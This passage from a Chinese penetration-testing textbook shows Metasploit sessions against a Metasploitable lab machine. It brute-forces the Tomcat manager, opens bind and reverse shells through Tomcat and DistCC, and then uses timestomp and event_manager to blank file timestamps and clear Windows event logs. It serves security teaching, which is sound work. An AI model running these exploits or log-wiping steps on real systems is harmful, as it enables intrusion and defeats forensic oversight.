## 辅助模块执行完成

```
msf auxiliary(smtp_version)>
```

从上面的输出可以看到，Metasploitable 服务器上运行着 Postfix 电子邮件服务。大量的辅助模块对于此类任务非常有帮助，通过这些模块可以获取目标系统上运行的软件版本列表，这对于选择攻击方式至关重要。

### 17.7 攻击 Apache Tomcat

现在我们再次进入渗透测试环节。在之前的研究中，我们已经发现目标系统存在多个安全漏洞，包括直接渗透攻击和可能的暴力破解。由于这是一次白盒测试，我们可以对目标系统进行全面的分析。首先，我们将尝试针对 Apache Tomcat 进行攻击。

根据之前的端口扫描结果，我们注意到 Apache Tomcat 安装在 8180 端口上。通过一些简单的互联网查询，我们了解到 Tomcat 的管理接口存在一个暴力破解漏洞。在确认了 Tomcat 服务版本后，我们发现攻击 Tomcat 管理器是攻陷系统的最佳途径之一。如果能够成功登录到 Tomcat 管理器，就可以使用 HTTP PUT 方法在目标系统上植入攻击载荷。以下是启动此次渗透攻击的过程（省略了一些攻击和载荷的输出）：

```plaintext
msf> search apache
...SNIP...
msf auxiliary(tomcat_mgr_login)> set RHOSTS 172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(tomcat_mgr_login)> set THREADS 50
THREADS => 50
msf auxiliary(tomcat_mgr_login)> set RPORT 8180
RPORT => 8180
msf auxiliary(tomcat_mgr_login)> set VERBOSE false
VERBOSE => false
msf auxiliary(tomcat_mgr_login)> run
[+] http://172.16.32.162:8180/manager/html [Apache-Coyote/1.1][Tomcat Application Manager] successful login 'tomcat':'tomcat'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(tomcat_mgr_login)>
```

我们的暴力破解成功了，Metasploit 成功地以用户名 `tomcat` 和密码 `tomcat` 登录到了 Tomcat 管理器，但并没有获得 Shell。接下来，利用新发现的凭证信息，我们使用 `multi/http/tomcat_mgr_deploy` 渗透模块中的 HTTP PUT 功能向目标系统植入攻击载荷。

```plaintext
msf auxiliary(tomcat_mgr_login)> use multi/http/tomcat_mgr_deploy
msf exploit(tomcat_mgr_deploy)> set password tomcat
password => tomcat
msf exploit(tomcat_mgr_deploy)> set username tomcat
username => tomcat
msf exploit(tomcat_mgr_deploy)> set RHOST 172.16.32.162
RHOST => 172.16.32.162
msf exploit(tomcat_mgr_deploy)> set LPORT 9999
LPORT => 9999
msf exploit(tomcat_mgr_deploy)> set RPORT 8180
RPORT => 8180
msf exploit(tomcat_mgr_deploy)> set payload linux/x86/shell_bind_tcp
payload => linux/x86/shell_bind_tcp
msf exploit(tomcat_mgr_deploy)> exploit
[*] Started bind handler
[*] Executing /FW36owipzcnHeUyIUaX/UGMIdfFjVENQOp4VveswTlma.jsp..
[*] Undeploying FW36owipzcnHeUyIUaX
[*] Command shell session 1 opened (172.16.32.129:43474 -> 172.16.32.162:9999) at 2010-05-21 23:57:47 -0400
msf>
```

我们获得了受限用户账号的 Shell，但无法在 `/root` 目录下写入文件，因为这需要根用户权限。通常情况下，Apache 服务是以非特权用户账户（如 `apache`、`httpd` 或 `www-data`）运行的。基于我们已知的目标主机操作系统版本，可以进一步使用本地提升攻击来获取根用户权限。

### 提示：无需特权提升即可在 Metasploitable 上获得 root 权限的方法

- SSH 可预测的伪随机数生成器渗透攻击：[Exploit-DB](http://www.exploit-db.com/exploits/5720/)

### 17.8 攻击偏门的服务

当仅进行默认的 nmap 端口扫描时，我们可能无法找出所有开放的端口。然而，我们现在已获得了系统的初始访问权，可以通过 `netstat -antp` 命令发现更多未被扫描出来的端口。例如，我们发现端口 3632 是开放的，并关联到 DistCC 服务。在线搜索告诉我们，DistCC 是一个可以在网络中的多台机器间分发 C/C++ 编译任务的服务，并且存在安全漏洞。

```plaintext
msf exploit(distcc_exec)> set payload linux/x86/shell_reverse_tcp
payload => linux/x86/shell_reverse_tcp
msf exploit(distcc_exec)> set LHOST 172.16.32.129
LHOST => 172.16.32.129
msf exploit(distcc_exec)> set RHOST 172.16.32.162
RHOST => 172.16.32.162
msf exploit(distcc_exec)> show payloads
Compatible Payloads
Name                     Rank    Description
cmd/unix/bind_perl       normal  Unix Command Shell, Bind TCP (via perl)
cmd/unix/bind_ruby       normal  Unix Command Shell, Bind TCP (via Ruby)
cmd/unix/generic         normal  Unix Command, Generic command execution
cmd/unix/reverse         normal  Unix Command Shell, Double reverse TCP (telnet)
cmd/unix/reverse_perl    normal  Unix Command Shell, Reverse TCP (via perl)
cmd/unix/reverse_ruby    normal  Unix Command Shell, Reverse TCP (via Ruby)
msf exploit(distcc_exec)> set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf exploit(distcc_exec)> exploit
[*] Started reverse double handler
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo q6Td9oaTrOkXsBXS;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets..
[*] Reading from socket A
[*] A: "q6Td9oaTrOkXsBXS\r\n"
[*] Matching...
[*] B is input..
[*] Command shell session 2 opened (172.16.32.129:4444 -> 172.16.32.162:47002) at 2010-05-22 00:08:04 -0400
whoami
daemon
mkdir /root/moo
mkdir: cannot create directory '/root/moo': Permission denied
```

我们仍然没有获得根用户权限。一次本地提升攻击可以帮助我们进一步攻陷系统并取得完全的根用户访问。请使用你在本书中学到的技能，在 Metasploitable 系统上成功获取根用户权限。你可以从 Exploit-DB 上找到相关的渗透代码。接受挑战，试试自己来获取这台机器上的根用户权限吧。

### 17.9 隐藏你的踪迹

在完成攻击后，下一步是要清除我们在每个被攻陷系统上留下的痕迹，特别是移除 Meterpreter Shell、恶意代码和其他攻击工具，以防止其他攻击者利用这些遗留的渗透代码进一步攻陷系统。

有时，你需要隐藏你的踪迹，尤其是在客户单位测试取证分析或入侵响应能力时。在这种情况下，你的目标是使任何取证分析或入侵检测系统失效。虽然很难完全隐藏所有的痕迹，但可以通过操纵系统来诱导取证分析人员，使其难以识别你的攻击范围。

在大多数情况下，如果你能够在取证分析过程中搞乱整个系统，使得取证分析者依赖的数据无法读取或变得混乱不堪，他们可能只能识别出系统已被感染或攻陷，但无法了解你从系统中获取了哪些信息。对抗取证分析的最佳方法是将整个系统完全重建并去除所有入侵痕迹，但这在渗透测试过程中很少见。

通常情况下，你会发现在内存空间中检测并应对 Meterpreter 很具挑战性，尽管最新的 Meterpreter 新方法可能会有所改善。厂商通常需要几个月的时间来检测这些问题并更新其产品特征库以具备检测能力。在大多数情况下，取证分析者识别完全处在内存中的渗透攻击还是相当困难的。

我们不会提供更深入的信息来隐藏你的踪迹，但在 Metasploit 中有几个特性值得提及：`timestomp` 和 `event_manager`。`timestomp` 是一个 Meterpreter 插件，可以修改、删除文件或设置文件的特定属性。以下是如何使用 `timestomp` 的示例：

```plaintext
meterpreter> timestomp
Usage: timestomp file_path OPTIONS
OPTIONS:
  -a  Set the "last accessed" time of the file
  -b  Set the MACE timestamps so that EnCase shows blanks
  -C  Set the "creation" time of the file
  -e  Set the "mft entry modified" time of the file
  -f  Set the MACE of attributes equal to the supplied file
  -h  Help banner
  -m  Set the "last written" time of the file
  -r  Set the MACE timestamps recursively on a directory
  -V  Display the UTC MACE values of the file
  -z  Set all four attributes (MACE) of the file
meterpreter> timestomp C:\\boot.ini -b
[*] Blanking file MACE attributes on C:\boot.ini
meterpreter>
```

在上述示例中，我们修改了时间戳，使得取证分析者使用流行的取证工具 EnCase 时，这些时间戳都会显示为空白。

`event_manager` 工具则会修改事件日志，使其不再显示可能揭示攻击发生的信息：

```plaintext
meterpreter> run event_manager
Meterpreter Script for Windows Event Log Query and Clear.
OPTIONS:
  -C  Clear a given Event Log (or ALL if no argument specified)
  -f  Event ID to filter events on
  -h  Help menu
  -i  Show information about Event Logs on the System and their configuration
  -l  List a given Event Log.
  -p  Supress printing filtered logs to screen
  -S  Save logs to local CSV file, optionally specify alternate folder in which to save logs
meterpreter> run event_manager -c
[-] You must specify an eventlog to query!
[*] Application:
[*] Clearing Application
[*] Event Log Application Cleared!
[*] MailCarrier 2.0:
[*] Clearing MailCarrier 2.0
[*] Event Log MailCarrier 2.0 Cleared!
[*] Security:
[*] Clearing Security
[*] Event Log Security Cleared!
[*] System:
[*] Clearing System
[*] Event Log System Cleared!
meterpreter>
```

通过这些工具，你可以有效地隐藏你的踪迹，减少被发现的风险。